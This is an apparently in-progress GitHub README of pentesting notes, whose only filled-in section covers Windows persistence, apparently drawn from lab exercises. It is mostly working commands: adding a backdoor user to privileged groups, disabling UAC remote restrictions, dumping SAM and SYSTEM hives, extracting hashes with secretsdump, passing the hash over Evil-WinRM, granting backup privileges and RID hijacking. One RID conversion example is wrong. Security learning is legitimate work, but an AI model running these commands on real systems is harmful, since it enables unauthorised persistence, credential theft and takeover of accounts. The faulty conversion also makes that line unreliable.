> [!Note]
> Heavy work in progress

<p align="center"><img alt="" src="" width="300" /></p>

*<p align="center">A curated list of steps/processes to use when tackling a certain problem.</p>*

When dealing with a certain challenge, you have to come up with a plan to come up with a solution. But you are not the first one to have dealt with this. So here I present a list of processes I have used that could help me and others finding the right programs/commands that they need.

<p align="center"><img alt="Need a better meme here.." src="https://github.com/Kevinovitz/cyber-security-megathread/raw/main/images/Cyber_Meme_07.png" width="300" /></p>

----

### Subjects

- [Knowledge Bases](#knowledge-bases)
- [Cheatsheets](#cheatsheets)
- [Tools Top Tips](#tools-top-tips)
- [Active Directory](#active-directory)
- [Command Injection](3command-injection)
- [Domain Enumeration](#domain-enumeration)
- [Hashes](#hashes)
- [Lateral Movement - Pass the Hash](#lateral-movement---pass-the-hash)
- [Misc](#misc)
- [Persistence](#persistence)
- [Windows Defender Anti-Virus](#windows-defender-anti-virus)
- [XSS - Cross Site Scripting](#xss---cross-site-scripting)

<br>

## Knowledge Bases

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

## Persistence

### Linux

### Windows

#### **Tampering With Unprivileged Accounts**
	
##### *Assign Group Memberships*
	
- Make user part of Administrators group.

```cmd
net localgroup "Administrators" thmuser1 /add
```

- If thats to suspicious, add to Backup Operators group and Remote Management for RDP.

```cmd
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- Remote into the machine (RDP or Evil-WinRM)

```console
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```

- Export and download SAM and SYSTEM registry hives.

```console
reg save hklm\system system.bak
reg save hklm\sam sam.bak

download system.bak
download sam.bak
```

- Dump hashes from SAM and SYSTEM hives.

```console
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- Pass the hash with admin account.

```console
evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

##### *Special Privileges and Security Descriptors*

- Add `SeBackupPrivilege` and `SeRestorePrivilege` to an account.

```cmd
secedit /export /cfg config.ini
secedit /import /cfg config.ini /db config.db
secedit /configure /db config.db /cfg config.ini
```

- Change WinRM security descriptor and add user here with full control.

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

##### *RID Hijacking*

- Find RIDs of user and admin user.

```cmd
wmic useraccount get name,sid
```

- Open regedit with privileges (tool must be present on target system).

```cmd
PsExec.exe -i -s regedit
```

- Find users here in the registry: `HKLM\SAM\SAM\Domains\Account\Users\` .

- Convert (admin) RID to hex value (i.e., 1010 = 0x1F4) and change F variable within the correct user key with the RID of the admin account (little endian notation = 04F1 -> F4 01).

- Admin hex RID ussualy is F4 01, put this on line 0030 of the F variable.

<!--- 

## TITLE

### Usefull documentation

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

### Related tools

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

--->
